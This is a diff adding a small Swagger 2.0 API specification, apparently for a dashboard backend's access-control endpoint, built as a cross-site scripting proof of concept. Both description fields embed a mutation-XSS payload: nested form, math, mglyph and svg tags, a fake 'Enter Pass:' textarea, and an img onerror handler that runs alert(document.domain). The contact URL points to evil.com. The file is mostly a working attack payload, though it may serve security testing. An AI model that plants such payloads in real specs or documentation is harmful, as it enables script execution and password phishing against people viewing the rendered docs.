@@ -1,0 +1,26 @@
+{
+    "swagger": "2.0",
+    "info": {
+      "description": "The backend<fOrm><mAth><mText></Form><form><mGlyph><sVg><MteXt><textArea>Enter Pass:</textArEa><IMg onerror=alert(document.domain) src=1>'></form> exposes an HTTP API, the same API is used by the frontend to do\neverything from saving dashboards, creating users and updating data sources.",
+      "title": "HTTP API.",
+      "contact": {
+        "name": "nguny",
+        "url": "https://evil.com",
+        "email": "hello@nguny.com"
+      },
+      "version": "2.0"
+    },
+    "paths": {
+      "/access-control/assignments/search": {
+        "post": {
+          "description": "Returns the result of the <fOrm><mAth><mText></Form><form><mGlyph><sVg><MteXt><textArea>Enter Pass:</textArEa><IMg onerror=alert(document.domain) src=1>'></form> search through access-control role assignments.\n\nYou need to have a permission with action `teams.roles:read` on scope `teams:*`\nand a permission with action `users.roles:read` on scope `users:*`.",
+          "tags": [
+            "enterprise"
+          ],
+          "summary": "Debug permissions.",
+          "operationId": "searchResult"
+         
+        }
+      }
+  }
+}
